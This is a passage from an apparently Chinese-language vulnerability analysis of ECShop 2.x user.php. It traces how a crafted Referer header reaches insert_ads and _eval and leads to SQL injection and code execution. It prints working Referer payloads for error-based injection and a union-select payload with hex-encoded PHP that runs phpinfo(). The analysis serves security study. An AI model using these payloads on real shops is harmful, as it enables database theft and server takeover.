$captcha = intval($_CFG[<span class="string">'captcha'</span>]);</div><div class="line">    <span class="keyword">if</span> (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION[<span class="string">'login_fail'</span>] &gt; <span class="number">2</span>)) &amp;&amp; gd_version() &gt; <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'enabled_captcha'</span>, <span class="number">1</span>);</div><div class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'rand'</span>, mt_rand());</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);</div><div class="line">    $smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>传入的Referer的值被<code>$GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]</code>这个服务器全局变量接收后到赋值给<code>$back_act</code>，之后<code>$back_act</code>变量作为参数传入<code>assign</code>方法，这个函数的功能主要用于注册模板变量，之后<code>$back_act</code>变量的值便赋值给了模板文件当中的<code>$back_act</code>变量，注册模板变量的代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 注册变量</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   mix      $tpl_var</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   mix      $value</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span>  void</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = <span class="string">''</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (is_array($tpl_var))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">foreach</span> ($tpl_var <span class="keyword">AS</span> $key =&gt; $val)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ($key != <span class="string">''</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;_var[$key] = $val;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;_var[$tpl_var] = $value;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>之后回到<code>user.php</code>，又调用了<code>display</code>这个方法，传入的参数是<code>user_passport.dwt</code>这个模板文件（这时模板文件当中的<code>$back_act</code>变量已经被注册为传入的Referer值），模板文件关键内容如下</strong></p><p><img src="http://pic.c1imber.top/blog/180907/DJEb9867Hm.png?imageslim" alt="mark"><br><strong>跟进到<code>display</code>函数代码的相关位置，代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 显示页面函数</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   string      $filename</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   sting      $cache_id</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span>  void</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;_seterror++;</div><div class="line">    error_reporting(E_ALL ^ E_NOTICE);</div><div class="line"></div><div class="line">    <span class="keyword">$this</span>-&gt;_checkfile = <span class="keyword">false</span>;</div><div class="line">    $out = <span class="keyword">$this</span>-&gt;fetch($filename, $cache_id);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strpos($out, <span class="keyword">$this</span>-&gt;_echash) !== <span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        $k = explode(<span class="keyword">$this</span>-&gt;_echash, $out);</div><div class="line">        <span class="keyword">foreach</span> ($k <span class="keyword">AS</span> $key =&gt; $val)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> (($key % <span class="number">2</span>) == <span class="number">1</span>)</div><div class="line">            &#123;</div><div class="line">                $k[$key] = <span class="keyword">$this</span>-&gt;insert_mod($val);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        $out = implode(<span class="string">''</span>, $k);</div><div class="line">    &#125;</div><div class="line">    error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</div><div class="line">    <span class="keyword">$this</span>-&gt;_seterror--;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> $out;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>display函数当中的<code>fetch</code>方法会对<code>user_passport.dwt</code>这个模板文件当中的变量进行解析，这时模板文件当中的<code>$back_act</code>变量和模板当中其它的变量经过<code>fetch</code>函数里面的<code>make_compiled</code>函数后被解析，经过处理之后的模板文件内容将返回给<code>$out</code>这个变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 处理模板文件</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   string      $filename</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   sting      $cache_id</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span>  sring</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</div><div class="line">    &#123;</div><div class="line">        error_reporting(E_ALL ^ E_NOTICE);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">$this</span>-&gt;_seterror++;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strncmp($filename,<span class="string">'str:'</span>, <span class="number">4</span>) == <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr($filename, <span class="number">4</span>)));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_checkfile)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> (!file_exists($filename))</div><div class="line">            &#123;</div><div class="line">                $filename = <span class="keyword">$this</span>-&gt;template_dir . <span class="string">'/'</span> . $filename;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $filename = <span class="keyword">$this</span>-&gt;template_dir . <span class="string">'/'</span> . $filename;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;direct_output)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;_current_file = $filename;</div><div class="line"></div><div class="line">            $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(file_get_contents($filename)));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ($cache_id &amp;&amp; <span class="keyword">$this</span>-&gt;caching)</div><div class="line">            &#123;</div><div class="line">                $out = <span class="keyword">$this</span>-&gt;template_out;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (!in_array($filename, <span class="keyword">$this</span>-&gt;template))</div><div class="line">                &#123;</div><div class="line">                    <span class="keyword">$this</span>-&gt;template[] = $filename;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                $out = <span class="keyword">$this</span>-&gt;make_compiled($filename);</div><div class="line"></div><div class="line">                <span class="keyword">if</span> ($cache_id)</div><div class="line">                &#123;</div><div class="line">                    $cachename = basename($filename, strrchr($filename, <span class="string">'.'</span>)) . <span class="string">'_'</span> . $cache_id;</div><div class="line">                    $data = serialize(<span class="keyword">array</span>(<span class="string">'template'</span> =&gt; <span class="keyword">$this</span>-&gt;template, <span class="string">'expires'</span> =&gt; <span class="keyword">$this</span>-&gt;_nowtime + <span class="keyword">$this</span>-&gt;cache_lifetime, <span class="string">'maketime'</span> =&gt; <span class="keyword">$this</span>-&gt;_nowtime));</div><div class="line">                    $out = str_replace(<span class="string">"\r"</span>, <span class="string">''</span>, $out);</div><div class="line"></div><div class="line">                    <span class="keyword">while</span> (strpos($out, <span class="string">"\n\n"</span>) !== <span class="keyword">false</span>)</div><div class="line">                    &#123;</div><div class="line">                        $out = str_replace(<span class="string">"\n\n"</span>, <span class="string">"\n"</span>, $out);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    $hash_dir = <span class="keyword">$this</span>-&gt;cache_dir . <span class="string">'/'</span> . substr(md5($cachename), <span class="number">0</span>, <span class="number">1</span>);</div><div class="line">                    <span class="keyword">if</span> (!is_dir($hash_dir))</div><div class="line">                    &#123;</div><div class="line">                        mkdir($hash_dir);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">if</span> (file_put_contents($hash_dir . <span class="string">'/'</span> . $cachename . <span class="string">'.php'</span>, <span class="string">'&lt;?php exit;?&gt;'</span> . $data . $out, LOCK_EX) === <span class="keyword">false</span>)</div><div class="line">                    &#123;</div><div class="line">                        trigger_error(<span class="string">'can\'t write:'</span> . $hash_dir . <span class="string">'/'</span> . $cachename . <span class="string">'.php'</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">$this</span>-&gt;template = <span class="keyword">array</span>();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">$this</span>-&gt;_seterror--;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</div><div class="line">    &#123;</div><div class="line">        error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $out; <span class="comment">// 返回html数据</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>之后判断返回的<code>$out</code>内容中是否有<code>_echash</code>这个值，如果存在，<code>_echash</code>的值将作为分割符对<code>$out</code>的内容进行分割，返回一个索引数组，将索引值为奇数的数组值传入<code>insert_mod</code>方法，ecshop2.x的<code>_echash</code>值如下</strong></p><p><img src="http://pic.c1imber.top/blog/180907/L36k2Fdfc0.png?imageslim" alt="mark"></p><p><strong>这也就是之前payload里面的那串hash值，这时payload当中<code>_echash</code>后面的那些内容<code>ads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code>就会被传入<code>insert_mod</code>方法</strong></p><p><strong>跟进<code>insert_mode</code>这个函数</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_mod</span><span class="params">($name)</span> // 处理动态内容</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">list</span>($fun, $para) = explode(<span class="string">'|'</span>, $name);</div><div class="line">    $para = unserialize($para);</div><div class="line">    $fun = <span class="string">'insert_'</span> . $fun;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $fun($para);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>此时传入的内容<code>$name</code>为<code>ads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code>，之后使用<code>expload</code>函数以<code>|</code>为分割符将传入的内容分为两部分，第一部分为<code>ads</code>，与<code>insert_</code>拼接后做为该函数的回调函数<code>insert_ads</code>,第二部为<code>a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code>这个序列化字符串，经过<code>unserialize</code>函数处理后返回一个数组，这个数组会被当作回调函数<code>insert_ads</code>的参数，接下来定位到<code>insert_ads</code>这个函数的位置，和SQL注入相关的代码部分如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span><span class="params">($arr)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">static</span> $static_res = <span class="keyword">NULL</span>;</div><div class="line"></div><div class="line">    $time = gmtime();</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($arr[<span class="string">'num'</span>]) &amp;&amp; $arr[<span class="string">'num'</span>] != <span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</div><div class="line">                    <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</div><div class="line">                <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</div><div class="line">                <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</div><div class="line">                <span class="string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span>.</div><div class="line">                    <span class="string">"AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] . <span class="string">"' "</span> .</div><div class="line">                <span class="string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="string">'num'</span>];</div><div class="line">        $res = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</div><div class="line">    &#125;</div><div class="line">...后面的代码忽略</div></pre></td></tr></table></figure><p><strong>可以看到将数组的值直接拼接到了sql语句中，所以到这已经成功定位到了注入漏洞的位置，在这里可以注入的位置有两个，分别是<code>$arr[&#39;id&#39;]</code>的位置和<code>$arr[&#39;num&#39;]</code>的位置，由于注入点的不同，构造payload的方式也不同，通过之前的一步步分析，payload的构造格式也很清楚了，需要写成<code>echash+ads+序列化处理后的索引数组(里面的键值为注入的payload)</code>，下面来构造payload</strong></p><p><strong>首先是<code>$arr[&#39;id&#39;]</code>这个位置，关于这个位置无需多说，使用正常的报错注入方法就行，构造payload</strong><br><img src="http://pic.c1imber.top/blog/180907/KKie54eEAF.png?imageslim" alt="mark"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;i:<span class="number">1</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">49</span>:<span class="string">"' and extractvalue(1,concat(0x3a,user(),0x3a))-- "</span>;&#125;</div></pre></td></tr></table></figure></p><p><strong>可以看到成功报错出了数据库的信息</strong><br><img src="http://pic.c1imber.top/blog/181019/fafJlkgiH2.png?imageslim" alt="mark"></p><p><strong>接下来是<code>$arr[&#39;num&#39;]</code>这个位置的注入，这个位置的注入比较特殊，因为它在limit的后面，因为mysql的语法规则，在limit后面只能使用<code>procedure analyse</code>这个函数去进行报错注入，并且有很多的局限性，下面先来简单说一下有关这个函数的使用</strong></p><pre><code>1.该函数的参数为两个，并且只有两个参数时才能报错，两个参数的位置均可以报错2.使用updatexml，extractvalue等报错函数报错查询数据时，不能在报错函数内使用select关键字查询数据3.可以时间盲注，但是不能使用sleep函数，但是可以使用benchmark函数取替代sleep</code></pre><p><strong>报错注入利用</strong><br><img src="http://pic.c1imber.top/blog/180907/iAl82c7LgF.png?imageslim" alt="mark"><br><strong>时间盲注利用</strong><br><img src="http://pic.c1imber.top/blog/180907/09JabDCCDd.png?imageslim" alt="mark"><br><strong>构造payload</strong><br><img src="http://pic.c1imber.top/blog/180907/3Gfcibd25b.png?imageslim" alt="mark"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">63</span>:<span class="string">"0,1 procedure analyse(extractvalue(1,concat(0x3a,user())),1)-- "</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;i:<span class="number">1</span>;&#125;</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/181019/m7ffIK0FgH.png?imageslim" alt="mark"></p><h3 id="代码执行漏洞分析"><a href="#代码执行漏洞分析" class="headerlink" title="代码执行漏洞分析"></a>代码执行漏洞分析</h3><p><strong>以下payload用于执行phpinfo()</strong></p><pre><code>访问:http://site/user.php?act=login然后在http请求头里面添加：Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;}554fcae493e564ee0dc75bdf2ebf94ca</code></pre><p><img src="http://pic.c1imber.top/blog/181019/hA0H6K4gFg.png?imageslim" alt="mark"><br><strong>首先继续看<code>insert_ads</code>函数，这里的代码执行是一个经典的二次漏洞，相关的重要代码部分如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$position_style = <span class="string">''</span>;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    $position_style = $row[<span class="string">'position_style'</span>];</div><div class="line">    ...省略无关部分</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$position_style = <span class="string">'str:'</span> . $position_style;</div><div class="line"></div><div class="line">$need_cache = $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching;</div><div class="line">$GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = <span class="keyword">false</span>;</div><div class="line"></div><div class="line">$GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'ads'</span>, $ads);</div><div class="line">$val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</div><div class="line"></div><div class="line">$GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = $need_cache;</div><div class="line"></div><div class="line"><span class="keyword">return</span> $val;</div></pre></td></tr></table></figure><p><strong>之前的过程和注入漏洞过程一样，经过一系列处理后，<code>$arr[&#39;id&#39;]</code>的值变为<code>&#39; /*</code>,<code>$arr[&#39;num&#39;]</code>的值变为<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>,之后<code>$arr[&#39;id&#39;]</code>和<code>$arr[&#39;num&#39;]</code>拼接进sql语句后执行的sql如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="keyword">RAND</span>() <span class="keyword">AS</span> rnd <span class="keyword">FROM</span> <span class="string">`ecshop273`</span>.<span class="string">`ecs_ad`</span> <span class="keyword">AS</span> a <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> <span class="string">`ecshop273`</span>.<span class="string">`ecs_ad_position`</span> <span class="keyword">AS</span> p <span class="keyword">ON</span> a.position_id = p.position_id <span class="keyword">WHERE</span> enabled = <span class="number">1</span> <span class="keyword">AND</span> start_time &lt;= <span class="string">'1539915783'</span> <span class="keyword">AND</span> end_time &gt;= <span class="string">'1539915783'</span> <span class="keyword">AND</span> a.position_id = <span class="string">''</span> <span class="comment">/*' ORDER BY rnd LIMIT */</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">0x27202f2a</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</span>,<span class="number">10</span><span class="comment">-- -</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/181019/8ACLcmbemg.png?imageslim" alt="mark"></p><p><strong>这里需要满足一个条件，那就是传入的<code>$arr[&#39;id&#39;]</code>要与sql语句执行结果的<code>$row[&#39;position_id&#39;]</code>值相等，当这一条件满足，就将字符串<code>str:</code>与执行结果<code>$row[&#39;position_style&#39;]</code>连接后赋值给<code>$position_style</code>变量，这时<code>$position_style</code>的值变为：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">str:&#123;$abc<span class="string">'];echo phpinfo/**/();//&#125;</span></div></pre></td></tr></table></figure><p><strong>之后将<code>$position_style</code>再次传入<code>fetch</code>方法，这时候满足条件的代码部分如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">...省略部分</div><div class="line"><span class="keyword">if</span> (strncmp($filename,<span class="string">'str:'</span>, <span class="number">4</span>) == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">    $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr($filename, <span class="number">4</span>)));</div><div class="line">&#125;</div><div class="line">...省略部分</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>可以看到这里就是存在二次漏洞的点，<code>_eval</code>函数将传入的<code>$position_style</code>,也就是sql语句执行的结果当做代码执行了，不过在<code>_eval</code>执行之前，传入了内容首先经过<code>substr</code>截取处理后传入了<code>fetch_str</code>函数，于是定位到<code>fetch_str</code>函数，相关代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 处理字符串函数</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   string     $source</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span>  sring</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch_str</span><span class="params">($source)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (!defined(<span class="string">'ECS_ADMIN'</span>))</div><div class="line">    &#123;</div><div class="line">        $source = <span class="keyword">$this</span>-&gt;smarty_prefilter_preCompile($source);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(preg_match_all(<span class="string">'~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\"\']?php[\"\']?)~is'</span>, $source, $sp_match))</div><div class="line">    &#123;</div><div class="line">        $sp_match[<span class="number">1</span>] = array_unique($sp_match[<span class="number">1</span>]);</div><div class="line">        <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</div><div class="line">        &#123;</div><div class="line">            $source = str_replace($sp_match[<span class="number">1</span>][$curr_sp],<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>,$source);</div><div class="line">        &#125;</div><div class="line">         <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</div><div class="line">        &#123;</div><div class="line">             $source= str_replace(<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>, <span class="string">'&lt;?php echo 